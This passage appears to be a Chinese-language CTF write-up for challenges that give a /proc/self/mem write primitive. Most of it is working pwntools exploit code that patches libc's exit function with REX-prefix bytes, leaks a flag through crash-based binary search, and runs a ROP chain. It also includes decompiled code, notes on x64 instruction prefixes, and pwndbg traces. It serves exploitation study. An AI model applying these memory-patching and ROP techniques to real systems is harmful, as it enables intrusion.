<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; disasm(<span class="string">&quot;\x7d\x7d&quot;</span>)</span></span><br><span class="line">&#x27;   0:   7d 7d                   jge    0x7f&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; disasm(<span class="string">&quot;\x7d\x67&quot;</span>)</span></span><br><span class="line">&#x27;   0:   7d 67                   jge    0x69&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># For a different libc change exit_base, first_ret and far_ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ip = &#x27;wfw3.2023.ctfcompetition.com&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">port = <span class="number">1338</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote_write</span>(<span class="params">r,address,length</span>):</span><br><span class="line">	<span class="comment">#print(&quot;Writing&quot;,hex(address) + &quot; &quot; + str(length))</span></span><br><span class="line">	payload = <span class="built_in">hex</span>(address) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(length)</span><br><span class="line">	payload += <span class="string">&#x27; &#x27;</span> * (<span class="number">64</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(payload) == <span class="number">64</span></span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line">r = remote(ip,port)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">end_data = output[output.rfind(<span class="string">b&quot;[&quot;</span>):]</span><br><span class="line">binary_base = <span class="built_in">int</span>(output.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">5</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(output.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">12</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libc_write</span>(<span class="params">r,offset,length</span>):</span><br><span class="line">	remote_write(r,libc_base + offset,length)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Binary base&quot;</span>,<span class="built_in">hex</span>(binary_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">exit_base = <span class="number">0x455f0</span></span><br><span class="line"><span class="comment">#exit_base = 0x000000000003e590</span></span><br><span class="line">first_ret = <span class="number">0x45680</span></span><br><span class="line"><span class="comment">#first_ret = 0x3e5f2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Figure out flag length</span></span><br><span class="line">flag_char_map = &#123;&#125;</span><br><span class="line">flag_char_map[<span class="string">&#x27;C&#x27;</span>] = <span class="number">0</span></span><br><span class="line">flag_char_map[<span class="string">&#x27;T&#x27;</span>] = <span class="number">1</span></span><br><span class="line">flag_char_map[<span class="string">&#x27;F&#x27;</span>] = <span class="number">2</span></span><br><span class="line">flag_char_map[<span class="string">&#x27;&#123;&#x27;</span>] = <span class="number">3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_character</span>(<span class="params">r,c,address</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">isinstance</span>(c,<span class="built_in">int</span>):</span><br><span class="line">		remote_write(r,address -c,c + <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		remote_write(r,address - flag_char_map[c],flag_char_map[c] + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_flag_length</span>(<span class="params">r,length</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Trying length&quot;</span>,length)</span><br><span class="line">	flag_char_map[<span class="string">&#x27;&#125;&#x27;</span>] = length - <span class="number">1</span></span><br><span class="line">	flag_char_map[<span class="string">&#x27;\0&#x27;</span>] = length</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(first_ret - <span class="number">1</span> , exit_base - <span class="number">1</span>, -<span class="number">2</span>):</span><br><span class="line">		write_character(r,<span class="string">&#x27;\0&#x27;</span>,libc_base + i)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r.send(<span class="string">&quot;finish&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> r.recv()</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;fail&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">	output = try_flag_length(r,i)</span><br><span class="line">	r.close()</span><br><span class="line">	r = remote(ip,port)</span><br><span class="line">	new_map = r.recvuntil(end_data)</span><br><span class="line">	libc_base = <span class="built_in">int</span>(new_map.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">12</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;OUTPUT = &quot;</span>,output)</span><br><span class="line">	<span class="keyword">if</span> output != <span class="string">&quot;fail&quot;</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Could not get length&quot;</span>)</span><br><span class="line">	exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length is&quot;</span>,flag_char_map[<span class="string">&#x27;\0&#x27;</span>])</span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill_nops</span>(<span class="params">r,address_start,address_end</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(address_end - <span class="number">1</span>,address_start - <span class="number">1</span>,-<span class="number">2</span>):</span><br><span class="line">		write_character(r,<span class="string">&#x27;\0&#x27;</span>,i)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes</span>(<span class="params">r,address,array</span>):</span><br><span class="line">	<span class="comment">#print(&quot;writing&quot;,array)</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array) - <span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">		write_character(r,array[i],address + i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_jump_snippet</span>(<span class="params">r,address,c,jumpsize_test</span>):</span><br><span class="line">	array = [<span class="string">&#x27;&#125;&#x27;</span>,c] <span class="comment"># jnp &lt;c-byte&gt;</span></span><br><span class="line">	array += [<span class="string">&#x27;T&#x27;</span>] * jumpsize_test</span><br><span class="line">	write_bytes(r,address,array)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Returns true if we didn&#x27;t crash</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crash_test</span>():</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r.send(<span class="string">&quot;finish&quot;</span>)</span><br><span class="line">		r.recv()</span><br><span class="line">		r.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;filling nops&quot;)</span></span><br><span class="line"><span class="comment">#print(&quot;writing jump snippet&quot;)</span></span><br><span class="line">far_ret = <span class="number">0x4586b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,flag_char_map[<span class="string">&#x27;\0&#x27;</span>]):</span><br><span class="line">	<span class="built_in">min</span> = <span class="number">0x20</span></span><br><span class="line">	<span class="built_in">max</span> = <span class="number">0x7f</span></span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">min</span> != <span class="built_in">max</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> &gt; <span class="number">1</span>:</span><br><span class="line">			middle = <span class="built_in">min</span> + ((<span class="built_in">max</span> - <span class="built_in">min</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			middle = <span class="built_in">max</span></span><br><span class="line">		<span class="comment">#print(min,middle,max)</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			fill_nops(r,libc_base + exit_base,libc_base + far_ret)</span><br><span class="line">			write_jump_snippet(r,libc_base + exit_base,i,middle)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;ignoring exception&quot;</span>)</span><br><span class="line">			r = remote(ip,port)</span><br><span class="line">			<span class="comment">#sleep(.1)</span></span><br><span class="line">			<span class="comment">#r.recv()</span></span><br><span class="line">			new_map = r.recvuntil(end_data)</span><br><span class="line">			libc_base = <span class="built_in">int</span>(new_map.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">12</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="comment">#input(&quot;Wait&quot;)</span></span><br><span class="line">		<span class="keyword">if</span> crash_test():</span><br><span class="line">			<span class="built_in">min</span> = middle</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">max</span> = middle - <span class="number">1</span></span><br><span class="line">		r = remote(ip,port)</span><br><span class="line">		new_map = r.recvuntil(end_data)</span><br><span class="line">		libc_base = <span class="built_in">int</span>(new_map.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">12</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">min</span>))</span><br></pre></td></tr></table></figure>

<h3 id="前置知识：x64指令前缀"><a href="#前置知识：x64指令前缀" class="headerlink" title="前置知识：x64指令前缀"></a>前置知识：x64指令前缀</h3><p>指令前缀占据1个字节，置于指令的操作确前，修改操作数或据作数集。指令前缀分3种类型：</p>
<ol>
<li>遗留前缀(Legacy Prefixes)：遗留前缀分为五组，每一个前缀都有一个唯一值。</li>
</ol>
<ul>
<li><p>操作数大小和地址大小前缀</p>
</li>
<li><p>段重写前缀</p>
</li>
<li><p>Lock前缀：引起某些读-修改-写指令以原子的方式执行</p>
</li>
<li><p>重复前缀：</p>
</li>
<li><ul>
<li>REP (F3h)</li>
<li>REPE 或REPZ (F3h)</li>
<li>REPNE 或REPNZ (F2h)（仅用于CMPSx 和SCASx指令：）</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p>寄存器扩展前缀（<strong>REX前缀</strong>，REX Prefixes）：REX前缀能在64位模式下扩展AMD64寄存器的用法，REX前缀的值介于40h到4Fh之间，具体取值取决于所期望的特定的扩展寄存器的组合。<strong>一条指令只能有一个REX前缀，必须紧接在指令的第一个操作码字节之前。 REX前缀在其他任何位置都将被忽略。</strong></p>
</li>
<li><p>扩展前缀(Extended Prefixes)：扩展前缀提供了一种转义机制，可为具有新功能的指令打开全新的指令编码空间。目前，有两种扩展前缀VEX和XOP，VEX前缀用于编码AVX指令，XOP用于编码XOP指令。</p>
</li>
</ol>
<h3 id="解题过程二"><a href="#解题过程二" class="headerlink" title="解题过程二"></a>解题过程二</h3><p>在第二题的基础上又限制了不能写elf的区域，只能写堆或者libc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">        v8 = read(v10, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(buf, <span class="string">&quot;0x%llx %u&quot;</span>, &amp;addr, &amp;n) != <span class="number">2</span></span><br><span class="line">          || n &gt; <span class="number">0x7F</span></span><br><span class="line">          || addr &gt;= (<span class="type">unsigned</span> __int64)main - <span class="number">0x5000</span> &amp;&amp; (<span class="type">unsigned</span> __int64)main + <span class="number">0x5000</span> &gt;= addr )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = open(<span class="string">&quot;/proc/self/mem&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        lseek64(v7, addr, <span class="number">0</span>);</span><br><span class="line">        write(v7, &amp;flag, n);</span><br><span class="line">        close(v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>由前置知识可知，<code>\x43(&#39;C&#39;)</code>是一个REX前缀，<strong>所以当我们用<code>\x43</code>覆盖某些指令时可以转义或被忽略（相当于nop）。</strong></p>
<p>并且由于main函数栈顶是我们输入的数据,于是我们可以通过改变exit函数里面的push个数，使其比pop少一个，就可以将执行流重定位到我们的输入去，然后再ROP即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000070</span> buf             dq ?</span><br><span class="line"><span class="number">-0000000000000068</span> var_68          dq ?</span><br><span class="line"><span class="number">-0000000000000060</span> var_60          dq ?</span><br><span class="line"><span class="number">-0000000000000058</span> var_58          dq ?</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">pc = <span class="string">&#x27;./chal&#x27;</span></span><br><span class="line">aslr = <span class="literal">True</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1337</span>]</span><br><span class="line">    p = remote(remote_addr[<span class="number">0</span>], remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s,addr</span>):</span><br><span class="line">    log.critical(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s, <span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(<span class="params">a=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr, size</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr), size))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ru(<span class="string">&#x27;expire\n&#x27;</span>)</span><br><span class="line">    elf_base = <span class="built_in">int</span>(rv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    elf.address = elf_base</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        rl()</span><br><span class="line">    heap_base = <span class="built_in">int</span>(rv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        rl()</span><br><span class="line">    libc_base = <span class="built_in">int</span>(rv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    lg(<span class="string">&#x27;elf&#x27;</span>, elf_base)</span><br><span class="line">    lg(<span class="string">&#x27;heap&#x27;</span>, heap_base)</span><br><span class="line">    lg(<span class="string">&#x27;libc&#x27;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">    target = [(<span class="number">0x45607</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x4560B</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x4560B</span>+<span class="number">4</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45610</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45611</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45612</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45613</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45616</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45618</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x45619</span>, <span class="number">1</span>),</span><br><span class="line">              (<span class="number">0x4561a</span>, <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">        edit(libc_base + x[<span class="number">0</span>], x[<span class="number">1</span>])</span><br><span class="line">        <span class="comment">#print(&#x27;&#123;&#125; &#123;&#125;&#x27;.format(hex(0x7ffff7d89000 + x[0]), x[1]))</span></span><br><span class="line"></span><br><span class="line">    prdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">    prsi = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">    prdx_r12 = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">    write = elf_base + <span class="number">0x1050</span> <span class="comment">#elf.plt[&#x27;write&#x27;]</span></span><br><span class="line">    flag = elf_base + <span class="number">0x50A0</span></span><br><span class="line"></span><br><span class="line">    rop = p64(prdi) + p64(<span class="number">1337</span>)</span><br><span class="line">    rop += p64(prsi) + p64(flag)</span><br><span class="line">    rop += p64(prdx_r12) + p64(<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">    rop += p64(write)</span><br><span class="line">    pause()</span><br><span class="line">    sl(rop)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<p>修改后的exit函数,可以看到push了两个，但是最后pop了三个，导致了执行流到了我们的输入中去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble 0x7fe254845607</span><br><span class="line">Dump of assembler code for function exit:</span><br><span class="line">   0x00007fe2548455f0 &lt;+0&gt;:     endbr64 </span><br><span class="line">   0x00007fe2548455f4 &lt;+4&gt;:     push   rax</span><br><span class="line">   0x00007fe2548455f5 &lt;+5&gt;:     pop    rax</span><br><span class="line">   0x00007fe2548455f6 &lt;+6&gt;:     mov    ecx,0x1</span><br><span class="line">   0x00007fe2548455fb &lt;+11&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007fe254845600 &lt;+16&gt;:    lea    rsi,[rip+0x1d4231]        # 0x7fe254a19838</span><br><span class="line">   0x00007fe254845607 &lt;+23&gt;:    rex.XB sub r12d,0x8</span><br><span class="line">   0x00007fe25484560b &lt;+27&gt;:    rex.XB cmp r13b,0xff</span><br><span class="line">   0x00007fe25484560f &lt;+31&gt;:    rex.XB</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disassemble 0x7fe254845619</span><br><span class="line">Dump of assembler code for function on_exit:</span><br><span class="line">   0x00007fe254845610 &lt;+0&gt;:     rex.XB</span><br><span class="line">   0x00007fe254845611 &lt;+1&gt;:     rex.XB</span><br><span class="line">   0x00007fe254845612 &lt;+2&gt;:     rex.XB</span><br><span class="line">   0x00007fe254845613 &lt;+3&gt;:     rex.XB</span><br><span class="line">   0x00007fe254845614 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007fe254845616 &lt;+6&gt;:     rex.XB push r11</span><br><span class="line">   0x00007fe254845618 &lt;+8&gt;:     rex.XB</span><br><span class="line">   0x00007fe254845619 &lt;+9&gt;:     rex.XB</span><br><span class="line">   0x00007fe25484561a &lt;+10&gt;:    rex.XB je 0x7fe2548456aa &lt;on_exit+154&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的是反汇编出来的，下面的是真实执行的过程的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  0x7fe2548455f0 &lt;exit&gt;         endbr64 </span><br><span class="line">  0x7fe2548455f4 &lt;exit+4&gt;       push   rax</span><br><span class="line">  0x7fe2548455f5 &lt;exit+5&gt;       pop    rax</span><br><span class="line">  0x7fe2548455f6 &lt;exit+6&gt;       mov    ecx, 1</span><br><span class="line">  0x7fe2548455fb &lt;exit+11&gt;      mov    edx, 1</span><br><span class="line">► 0x7fe254845600 &lt;exit+16&gt;      lea    rsi, [rip + 0x1d4231]</span><br><span class="line">  0x7fe254845607 &lt;exit+23&gt;      sub    r12d, 8</span><br><span class="line">  0x7fe25484560b &lt;exit+27&gt;      cmp    r13b, 0xff</span><br><span class="line">  0x7fe25484560f &lt;exit+31&gt;      push   r12</span><br><span class="line">  0x7fe254845616 &lt;on_exit+6&gt;    push   r11</span><br><span class="line">  0x7fe254845618 &lt;on_exit+8&gt;    je     on_exit+154                &lt;on_exit+154&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是返回处</p>
